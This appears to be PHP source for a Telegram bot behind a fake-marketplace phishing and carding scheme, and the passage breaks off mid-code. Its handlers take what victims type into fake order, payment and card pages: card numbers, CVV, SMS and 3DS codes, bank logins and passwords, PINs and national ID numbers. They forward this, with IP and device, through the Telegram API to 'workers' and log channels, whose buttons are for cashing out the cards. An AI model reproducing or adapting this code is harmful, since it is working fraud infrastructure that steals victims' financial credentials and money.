ini_set ('display_errors',0);
error_reporting (E_ALL);

require_once ('./api/Connector.php');
$con = new Connector ();




$key  = $con->config->botApi; 
 

$urlApi = 'https://api.telegram.org/bot';

$bot_config = file_get_contents('./bot_config.json'); 
$bot_config = json_decode($bot_config); 
$bot_config = $bot_config[0];


$bot_chanels = file_get_contents('./chanels.json');
$bot_chanels = json_decode($bot_chanels); 
$bot_chanels = $bot_chanels[0];
 
function curs($sum,$from,$to){
    $curses = file_get_contents('https://www.cbr-xml-daily.ru/daily_json.js');
    $curses = json_decode($curses);
    $from_perone = $curses->Valute->{$from}->Value/$curses->Valute->{$from}->Nominal;
    $from_perall = $from_perone*$sum;
    
    if($to=='RUB'||!$to||!$curses->Valute->{$to}){
        $go = floor($from_perall).' руб.';
    }else{
        $to_perone = $curses->Valute->{$to}->Value/$curses->Valute->{$to}->Nominal;

        $cur = $to;
        if($to=='USD'){ $cur = '$';}
        if($to=='EUR'){ $cur = '€';}
        if($to=='UAH'){ $cur = 'грн.';} 

        $go = floor($from_perall/$to_perone).' '.$cur;
    }
    return $go;
}
 


    $rawData = file_get_contents("php://input");
    $post = json_decode($rawData); 

   
     
    
    if($post->callback_query){
        $post=$post->callback_query;
        $post->message->{'text_origin'} = $post->message->text; 
        $post->message->{'text'} = $post->data; 
    } 
    /*  $c = file_get_contents('./log.txt');
    file_put_contents('./log.txt',$c.json_encode($post)."\n\n");      */
 

    
 
    if($_GET['support_message']=='send'){
        $token = $con->request->get('token');
        $pid = $con->request->get('product');
        $con->products->update_product($pid,array('token'=>$token)); 
        $product = (object)$con->products->get_product($pid); 
        $usr = $con->user->get_user_byid($product->uid);
        $message = $con->request->get('message'); 
        $ip = $con->request->get('ip');
        $device = $con->request->get('device');
 
        $con->products->add_message(array(
            'token'=>$token,
            'message'=>$message,
            'sender'=>'f',
            'chat_id'=>$usr->chat_id,
            'is_read'=>1
        )); 
        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> 👩‍🔧 Тех.поддержка 👩‍🔧\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$ip."\n📬 <b>Устройство</b>: ".$device."\n📬 Token:".$token."\n\n📬 <b>Сообщение</b>: ".$message."\n\n📬 Ответь на это сообщение, чтоб написать мамонту в тп\n\n"
        ];    
        
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    }

    if($_GET['support_message']=='get'){
        $token = $con->request->get('token');
        echo json_encode($con->products->get_messages($token));
    }
    if($_GET['support_message']=='getone'){
        $token = $con->request->get('token');
        $msgs = $con->products->get_messages($token,true);
        foreach($msgs as $v){
            $con->products->update_messages($v->id,array(
                'is_read'=>1
            ));
        }
        echo json_encode($msgs);
    }
//".$_GET['page']."
    if($_GET['visit']=='left'){
        $pid = $con->request->get('pid');
        $product = (object)$con->products->get_product($pid);  
        $usr = $con->user->get_user_byid($product->uid);

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> Покидает страницу \n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    }
    
    if($_GET['visit']=='order'){  
        $token = $con->request->get('token');
        $pid = $con->request->get('product');
        $con->products->update_product($pid,array('token'=>$token)); 
        $product = (object)$con->products->get_product($pid); 
        $usr = $con->user->get_user_byid($product->uid);

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> Переход на ссылку\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."\n📬 Token:".$token."\n📬 Ответь на это сообщение, чтоб написать мамонту в тп\n\n" 
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    }
    
    if($_GET['visit']=='oplata'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid);  
        $usr = $con->user->get_user_byid($product->uid);

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> Переход на оплату\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    } 
    if($_GET['visit']=='card'){  
        $pid = $con->request->get('product');
        $con->products->update_product($_GET['product'],array('ip'=>$_GET['ip'],'device'=>$_GET['device']));
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid);
        $worker = (object)$con->user->get_user_byid($product->uid);  
        
        if(!$card->number){ exit(); }

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс карты</b>: ".$card->balance." ".$product->currancy."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~~ */
        $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
        $inline_keyboard = [[$btn1]]; 

       /*  if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
            exit();
        } */
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }
        if($card->bank_key){
            $banking .= "\n💳 <b>Key</b>: ****";
        }
        if($card->cardPersonnummer){
            $banking .= "\n💳 <b>Personnummer</b>: ****";
        }

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
            'parse_mode'=>'HTML',
            'text' => "".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>".$_GET['card']." Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n",
            'reply_markup'=>$replyMarkup
        ];     
        $log_result = file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        $log_result = json_decode($log_result);
        if($log_result->ok&&$_GET['card']){
            $con->user->update_card($_GET['card'],array('message_id'=>$log_result->result->message_id));
        }
        exit();
    }
    if($_GET['visit']=='sms'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid); 
        $worker = (object)$con->user->get_user_byid($product->uid); 

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> ✉️ SMS введена ✉️\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~ */
        /* if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
            exit();
        } */
        if($card->vblogin){
            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$product->id."_".$card->id); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$product->id."_".$card->id);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$product->id."_".$card->id);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$product->id."_".$card->id);
            $btn5 = array("text" => "🗑💬 Фейк Код","callback_data" => "/set_log_fakecode_".$product->id."_".$card->id);
            $btn6 = array("text" => "💬 Code sent","callback_data" => "/set_log_code_".$product->id."_".$card->id);
            $btn7 = array("text" => "📤 Push sent","callback_data" => "/set_log_push_".$product->id."_".$card->id);
            $btn8 = array("text" => "⏳ Жду ЛК","callback_data" => "/set_log_waitlk_".$product->id."_".$card->id);
            $btn9 = array("text" => "✅ Успех ".$card->id,"callback_data" => "/set_log_ok_".$product->id."_".$card->id);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5,$btn6],[$btn7,$btn8],[$btn9]]; 
             
        }else{
            $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
            $inline_keyboard = [[$btn1]];
        }
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }

        $market_name_nos = '';
        if($bot_config->markets->{$product->country}){
            $market_name_nos = $bot_config->markets->{$product->country}->name;
        }else{
            $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
        }

            $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
                'message_id'=> $card->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог <code>".$card->id."</code> бьет @".$card->vblogin."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> ✉️ SMS введена ✉️\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: ".($card->vbid?"****":"<code>".$card->sms."</code>")." 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').") \n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n" 
            ];  

            $data['reply_markup']=$replyMarkup; 

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            if($card->vbid){
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: <code>".$card->bank_haslo."</code>";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: <code>".$card->bank_pin."</code>";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: <code>".$card->bank_pesel."</code>";
                }
                if($card->bank_nmatki){
                    $banking .= "\n💳 <b>Ф. матери</b>: <code>".$card->bank_nmatki."</code>";
                } 
                if($card->bank_nojca){
                    $banking .= "\n💳 <b>Ф. отца</b>: <code>".$card->bank_nojca."</code>";
                } 
                if($card->bank_key){
                    $banking .= "\n💳 <b>Key</b>: <code>".$card->bank_key."</code>";
                }
                if($card->cardPersonnummer){
                    $banking .= "\n💳 <b>Personnummer</b>: <code>".$card->cardPersonnummer."</code>";
                }

                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }
                
                $data = [
                    'chat_id' => $card->vbid,
                    'parse_mode'=>'HTML',
                    'text' => "💳 Данные из лога ⚠️ Ввод SMS\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: <code>".$card->cvv."</code>".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n"
                ]; 
                
    

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            }

        exit();
    }
    if($_GET['visit']=='banking'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid); 
        $worker = (object)$con->user->get_user_byid($product->uid); 

        $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n🏦 Данные банкинга введены 🏦\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~ */
        /* if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
            exit();
        } */
        if($card->vblogin){
            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$product->id."_".$card->id); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$product->id."_".$card->id);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$product->id."_".$card->id);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$product->id."_".$card->id);
            $btn5 = array("text" => "🗑💬 Фейк Код","callback_data" => "/set_log_fakecode_".$product->id."_".$card->id);
            $btn6 = array("text" => "💬 Code sent","callback_data" => "/set_log_code_".$product->id."_".$card->id);
            $btn7 = array("text" => "📤 Push sent","callback_data" => "/set_log_push_".$product->id."_".$card->id);
            $btn8 = array("text" => "⏳ Жду ЛК","callback_data" => "/set_log_waitlk_".$product->id."_".$card->id);
            $btn9 = array("text" => "✅ Успех ".$card->id,"callback_data" => "/set_log_ok_".$product->id."_".$card->id);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5,$btn6],[$btn7,$btn8],[$btn9]]; 
        }else{
            $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
            $inline_keyboard = [[$btn1]];
        }
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }
        if($card->bank_key){
            $banking .= "\n💳 <b>Key</b>: ****";
        }
        if($card->cardPersonnummer){
            $banking .= "\n💳 <b>Personnummer</b>: ****";
        }

        $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }

            $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
                'message_id'=> $card->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог <code>".$card->id."</code> бьет @".$card->vblogin."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n🏦 Данные банкинга введены 🏦\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').") \n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n" 
            ]; 
            //file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));  

            $data['reply_markup']=$replyMarkup; 

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            if($card->vbid){
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: <code>".$card->bank_haslo."</code>";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: <code>".$card->bank_pin."</code>";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: <code>".$card->bank_pesel."</code>";
                }
                if($card->bank_nmatki){
                    $banking .= "\n💳 <b>Ф. матери</b>: <code>".$card->bank_nmatki."</code>";
                } 
                if($card->bank_nojca){
                    $banking .= "\n💳 <b>Ф. отца</b>: <code>".$card->bank_nojca."</code>";
                } 
                if($card->bank_key){
                    $banking .= "\n💳 <b>Key</b>: <code>".$card->bank_key."</code>";
                }
                if($card->cardPersonnummer){
                    $banking .= "\n💳 <b>Personnummer</b>: <code>".$card->cardPersonnummer."</code>";
                }

                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }

                $data = [
                    'chat_id' => $card->vbid,
                    'parse_mode'=>'HTML',
                    'text' => "💳 Данные из лога ⚠️ Ввод SMS\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: <code>".$card->cvv."</code>".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n"
                ]; 
                
    

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            }


        exit();
    }


    if($post->message){
        $u = array(
            'chat_id'=>$post->message->chat->id,
            'login'=>$post->message->chat->username,
            'fname'=>$post->message->chat->first_name
        );
        $ua = array(
            'chat_id'=>$post->message->from->id,
            'login'=>$post->message->from->username,
            'fname'=>$post->message->from->first_name
        );

        $usr = $con->user->get_user($u);
        $usra = $con->user->get_user($ua);

        if($usra->is_ban){

            $data = [
                'chat_id' => $post->message->chat->id,   
                'parse_mode'=>'HTML',
                'text' => "Уважаемый <b>".$usra->login."</b>! Забанен! \n\n"
            ];  
            

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();
        }

        if(!$post->message->from->username&&!$post->message->chat->username&&$post->message->chat->type!='channel'&&$post->message->chat->type!='group'&&$post->message->chat->type!='supergroup'){

            $btn1 = array("text" => "🔄 Попробовать еще раз","callback_data" => "/start");
            $inline_keyboard = [[$btn1]]; 
            
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "Уважаемый ".($post->message->chat->first_name?$post->message->chat->first_name:'пользователь')."! Для дальнейшего использования бота Вам необходимо в профиле задать свой логин! \n\n",
                'reply_markup'=>$replyMarkup
            ];  
            

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();
        }

        if($post->message->chat->username!=$usr->login){
            $con->user->update_user($post->message->chat->id,array('login'=>$post->message->chat->username));
        }

        if(strpos($post->message->text,'Отмена ввода успеха')!==false){ 
            $card = (object)$con->user->get_card_ok($post->message->from->id); 

            $con->user->update_card($card->id,array("vbiv_status"=>NULL));
            $data = [
                'chat_id' => $post->message->chat->id, 
                'text'=>'Действие отменено!',
                'reply_markup'=>json_encode(array('remove_keyboard'=>true))
            ];  
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        }

        /*~~ User Register ~~*/
        if($post->message->chat->type=="private"&&(strpos($post->message->text,'/start')!==false||strpos($post->message->text,'/menu')!==false||strpos($post->message->text,'Отмена')!==false)){ 
            
            if(!$usr||$usr==false)
            { 
                $usr = $con->user->add_user($u);   
            } 
            $usr = (object)$usr;

            if($usr->now_settings!=''){
                $con->user->update_user($usr->chat_id,array("now_settings"=>''));
                $usr->now_settings = '';
            }

            if(!$usr->status||$usr->status==NULL)
            {  
                $btn1 = array("text" => "Куда я попал❓","url" => $bot_chanels->chanels->chanel_about->invite_link);
                $btn2 = array("text" => "✅ Начнём!","callback_data" => "/go");
                
                $inline_keyboard = [[$btn1,$btn2]]; 
    
            }
            else
            {
                $inline_keyboard = [];  
                foreach($bot_config->countries as $k=>$v){
                    $btn = array("text" => $v->name,"callback_data" => '/country_'.$v->code);  
                    if(count($inline_keyboard)>=1&&count($inline_keyboard[count($inline_keyboard)-1])<2){
                        $inline_keyboard[count($inline_keyboard)-1][]= $btn;
                    }else{
                        $inline_keyboard[]= [$btn];
                    } 
                } 
                    foreach($bot_config->markets as $k=>$v){
                        $inline_keyboard[]= array(array("text" => $v->name,"callback_data" => "/generate_".$k."_".$k));
                    }
                    $inline_keyboard[]=array(
                        array("text" => "🗄 Мои товары","callback_data" => "/myproductsshow")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "📚 Мануалы","url" => $bot_chanels->chanels->chanel_manuals->invite_link),
                        array("text" => "💭 Чаты","callback_data" => "/chats_all")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "💰 Выплаты","url" => $bot_chanels->chanels->chanel_payments->invite_link)
                    );
            }   
                         
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 


                if(strpos($post->message->text,'Отмена')!==false||strpos($post->message->text,'/start_back')!==false){
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'text'=>'Действие отменено!',
                        'reply_markup'=>json_encode(array('remove_keyboard'=>true))
                    ];  
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                }
             
                if(!$usr->status||$usr->status==NULL)
                {  
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'parse_mode'=>'HTML',
